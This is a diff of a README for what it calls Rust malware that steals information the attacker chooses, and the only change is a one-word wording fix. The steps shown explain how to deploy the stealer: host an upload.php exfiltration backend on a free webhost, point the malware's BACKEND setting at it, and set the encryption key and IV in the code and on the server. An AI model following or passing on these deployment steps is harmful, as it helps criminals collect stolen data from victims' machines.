@@ -29,7 +29,7 @@ This is a malware written in Rust that steals the information the attacker choos
 4. Get a webhost you can get a free one from [here](https://www.000webhost.com/)
 5. Get the `assets/upload.php` and upload it to your webhost
 6. Change the `BACKEND` in `src/constants.rs` to yours
-7. Get a 256-bit and a 128-bit iv from [here](https://www.allkeysgenerator.com/Random/Security-Encryption-Key-Generator.aspx)
+7. Get a 256-bit key and a 128-bit iv from [here](https://www.allkeysgenerator.com/Random/Security-Encryption-Key-Generator.aspx)
 8. Convert both of them to base64 [here](https://www.base64encode.org/)
 9. Use those values in `encryption-macro/src/lib.rs` and the `upload.php` on your backend
 10. Set the options you want in `constants.rs`
